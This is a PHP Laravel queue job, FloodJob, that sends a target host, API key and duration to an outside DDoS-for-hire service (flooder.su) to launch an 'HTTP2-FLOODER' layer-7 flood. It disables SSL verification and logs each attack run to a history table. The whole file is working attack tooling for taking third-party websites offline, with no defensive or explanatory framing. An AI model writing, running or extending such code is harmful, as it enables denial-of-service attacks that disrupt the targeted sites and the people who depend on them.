<?php

namespace App\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

class FloodJob implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    protected $host;
    protected $apiKey;
    protected $time;

    public function __construct($host, $apiKey, $time)
    {
        $this->host = $host;
        $this->apiKey = $apiKey;
        $this->time = $time;
    }

    public function handle()
    {
        try {
            $url = "https://flooder.su/API/l7";
            $params = [
                'api_key' => $this->apiKey,
                'host' => $this->host,
                'time' => $this->time,
                'method' => 'HTTP2-FLOODER',
                'rmethod' => 'GET',
                'data' => '',
                'header' => 'GET',
                'request' => '50',
                'geo' => 'WORLDWIDE',
                'concurrents' => '1',
            ];

            // Send the POST request without SSL verification
            $response = Http::withoutVerifying()->post($url, $params);

            // Log the response
            if ($response->successful()) {
                DB::table('history')->insert([
                    'host' => $this->host,
                    'executed_at' => now(),
                    'response' => $response->json(),
                ]);
            } else {
                Log::error("API request failed: " . $response->body());
            }
        } catch (\Exception $e) {
            Log::error("FloodJob failed: " . $e->getMessage());
        }
    }
}
